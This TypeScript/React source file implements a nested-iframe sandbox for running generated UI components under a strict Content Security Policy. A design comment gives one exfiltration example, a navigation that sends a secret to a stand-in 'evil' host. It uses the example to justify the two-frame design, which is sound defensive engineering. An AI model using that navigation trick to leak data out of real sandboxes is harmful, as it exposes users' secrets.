import { useEffect, useMemo, useRef, useState, type CSSProperties } from "react";
import type { Json, ToolOutcome } from "@vendoai/core";
import { ContainedNotice } from "../notice.js";
import { JAIL_RUNTIME_SOURCE } from "./runtime-bundle.gen.js";

const MAX_JAIL_HEIGHT = 8_192;

/**
 * The jail is TWO nested frames, and the nesting is the security boundary.
 *
 * CSP's fetch directives close every *subresource* channel out of generated
 * code — `connect-src 'none'` (fetch/XHR/WebSocket/sendBeacon), `img-src data:`
 * (pixel beacons) — and the sandbox (no allow-forms / allow-popups /
 * allow-same-origin) closes form posts, popups, and the parent realm. But a
 * document NAVIGATING ITSELF is governed by none of them: browser-verified,
 * `location.href = "https://evil/?" + secret` from inside a single-frame jail
 * reached the network and returned a real response.
 *
 * The directive that *does* govern a nested context's navigation is the
 * EMBEDDER's `frame-src`. So the generated code runs in an inner frame whose
 * embedder is an outer frame we author, whose `default-src 'none'` makes
 * `frame-src` fall back to `'none'` — blocking the inner frame's navigations
 * (and any frame it spawns) while `about:srcdoc` still loads. The outer frame
 * runs no untrusted code; it is a message relay, so the host's postMessage
 * identity check (source === iframe.contentWindow) still holds end to end.
 *
 * `'unsafe-eval'` is deliberate: evaluation is the jail's job (generated code
 * loads through the runtime's controlled `require`, which exposes only React,
 * so no import form can reach the module loader). NETWORK is what the jail
 * forbids, and `blob:` is banned from script-src because blob-ESM made the
 * loader reachable.
 */
function buildJailSrcdoc(): string {
  const nonce = jailNonce();
  const csp = [
    "default-src 'none'",
    `script-src 'nonce-${nonce}' 'unsafe-eval'`,
    "style-src 'unsafe-inline'",
    "img-src data:",
    "font-src data:",
    "connect-src 'none'",
  ].join("; ");
  const head = [
    `<meta http-equiv="Content-Security-Policy" content="${csp}">`,
    "<meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">",
    "<style>*,*::before,*::after{box-sizing:border-box}html,body{margin:0;padding:0;background:transparent;height:100%}iframe{display:block;width:100%;height:100%;border:0;background:transparent}</style>",
  ].join("");

  // The inner document: the runtime plus the generated code it later renders.
  const safeRuntime = JAIL_RUNTIME_SOURCE.replace(/<\/script/gi, "<\\/script");
  const inner = [
    "<!doctype html><html lang=\"en\"><head>",
    head,
    "<title>Generated Vendo component</title></head><body>",
    `<script nonce="${nonce}">${safeRuntime}<\/script>`,
    "</body></html>",
  ].join("");

  // The outer document: a trusted relay whose policy jails the inner frame's
  // navigations. Escaping `<` keeps the inner HTML from closing this script.
  const relay = `
var inner = document.createElement("iframe");
inner.setAttribute("sandbox", "allow-scripts");
inner.setAttribute("title", "Generated Vendo component");
inner.srcdoc = ${JSON.stringify(inner).replace(/</g, "\\u003C")};
document.body.appendChild(inner);
window.addEventListener("message", function (event) {
  if (event.source === parent) inner.contentWindow.postMessage(event.data, "*");
  else if (event.source === inner.contentWindow) parent.postMessage(event.data, "*");
});
`;
  return [
    "<!doctype html><html lang=\"en\"><head>",
    head,
    "<title>Vendo jail</title></head><body>",
    `<script nonce="${nonce}">${relay}<\/script>`,
    "</body></html>",
  ].join("");
}

/** A per-mount nonce. Not a secret: the srcdoc is fully ours (generated source
 *  never enters the HTML — it arrives over postMessage), so a non-crypto
 *  fallback keeps the jail working in non-secure contexts. */
function jailNonce(): string {
  const random = globalThis.crypto?.randomUUID?.();
  return (random ?? `${Date.now().toString(36)}${Math.random().toString(36).slice(2)}`).replaceAll("-", "");
}

export interface JailedComponentProps {
  name: string;
  source: string;
  /** Live tree props. Absent means the captured sampleProps rehearsal stub wins. */
  props?: Record<string, unknown>;
  furnishing?: JailFurnishing;
  /** Host brand tokens as `--vendo-*` custom properties, applied to the jail root. */
  themeVars?: Record<string, string>;
  onAction(action: string, payload?: Json): Promise<ToolOutcome>;
  onStateSet(key: string, value: Json): void;
}

export interface JailSubSource {
  source: string;
  imports: Record<string, string>;
}

export interface JailStyle {
  path: string;
  css: string;
}

/** Structural copy of the additive pin-baseline furnishing; ui depends on core only. */
export interface JailFurnishing {
  sourceImports?: Record<string, string>;
  subSources?: Record<string, JailSubSource>;
  sampleProps?: Record<string, unknown>;
  styles?: JailStyle[];
}

/** 08-ui §5 — generated code runs only in this opaque-origin iframe. */
export function JailedComponent({
  name,
  source,
  props,
  furnishing,
  themeVars,
  onAction,
  onStateSet,
}: JailedComponentProps) {
  const iframeRef = useRef<HTMLIFrameElement>(null);
  const [error, setError] = useState<string>();
  const srcDoc = useMemo(buildJailSrcdoc, []);

  useEffect(() => {
    setError(undefined);
  }, [furnishing, name, source]);

  useEffect(() => {
    const iframe = iframeRef.current;
    if (!iframe) return;
    const sendRender = () => {
      iframe.contentWindow?.postMessage({
        vendo: true,
        kind: "render",
        source,
        props: props ?? furnishing?.sampleProps ?? {},
        ...(furnishing?.sourceImports === undefined ? {} : { sourceImports: furnishing.sourceImports }),
        ...(furnishing?.subSources === undefined ? {} : { subSources: furnishing.subSources }),
        ...(furnishing?.styles === undefined ? {} : { styles: furnishing.styles }),
        ...(themeVars === undefined ? {} : { themeVars }),
      }, "*");
    };
    const handleMessage = (event: MessageEvent) => {
      if (event.source !== iframe.contentWindow) return;
      const message = event.data as Record<string, unknown> | undefined;
      if (!message) return;

      if (message.kind === "booted") {
        sendRender();
      } else if (message.kind === "state-set" && typeof message.key === "string") {
        onStateSet(message.key, message.value as Json);
      } else if (message.kind === "action" && typeof message.action === "string") {
        const requestId = message.requestId;
        void onAction(message.action, message.payload as Json)
          .then((outcome) => {
            iframe.contentWindow?.postMessage({
              vendo: true,
              kind: "action-result",
              requestId,
              outcome,
            }, "*");
          })
          .catch((actionError: unknown) => {
            iframe.contentWindow?.postMessage({
              vendo: true,
              kind: "action-result",
              requestId,
              error: actionError instanceof Error ? actionError.message : String(actionError),
            }, "*");
          });
      } else if (message.kind === "error") {
        setError(typeof message.message === "string" ? message.message : "generated component failed");
      } else if (message.kind === "empty") {
        setError("generated component rendered no content");
      } else if (message.kind === "resize" && typeof message.height === "number" && Number.isFinite(message.height)) {
        iframe.style.height = `${Math.min(MAX_JAIL_HEIGHT, Math.max(1, message.height))}px`;
      }
    };

    window.addEventListener("message", handleMessage);
    iframe.addEventListener("load", sendRender);
    sendRender();
    return () => {
      window.removeEventListener("message", handleMessage);
      iframe.removeEventListener("load", sendRender);
    };
  }, [furnishing, onAction, onStateSet, props, source, themeVars]);

  if (error) {
    return <ContainedNotice label="Generated component error">{`${name}: ${error}`}</ContainedNotice>;
  }

  const style: CSSProperties = {
    width: "100%",
    minHeight: "var(--vendo-jail-min-height, 16px)",
    border: 0,
    background: "transparent",
  };
  return (
    <iframe
      ref={iframeRef}
      title={`Generated component: ${name}`}
      sandbox="allow-scripts"
      srcDoc={srcDoc}
      style={style}
    />
  );
}
